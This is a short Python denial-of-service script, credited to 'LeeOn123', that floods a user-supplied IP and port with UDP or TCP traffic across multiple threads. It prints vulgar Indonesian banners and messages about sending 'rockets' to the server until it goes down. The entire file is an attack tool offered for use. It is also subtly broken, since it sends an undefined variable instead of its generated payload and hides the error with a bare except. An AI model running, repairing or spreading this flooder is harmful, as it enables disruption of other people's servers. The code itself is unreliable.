#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print("--> KONTOL ATTACK ANJING <--")
print("#-- AWOKAWOK TEMBUS KONTOL --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def Attack():
	bytes = random._urandom(577)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MENGIRIM ROCKET KE SERVER SAMPAI DOWN")
		except:
			print("[!] MENGIRIM ROCKET KE SERVER SAMPAI DOWN")

def Attack2():
	bytes = random._urandom(10)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MENGIRIM ROCKET KE SERVER SAMPAI DOWN")
		except:
			s.close()
			print("[*] MENGIRIM ROCKET KE SERVER SAMPAI DOWN")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = Attack)
		th.start()
	else:
		th = threading.Thread(target = Attack2)
		th.start()
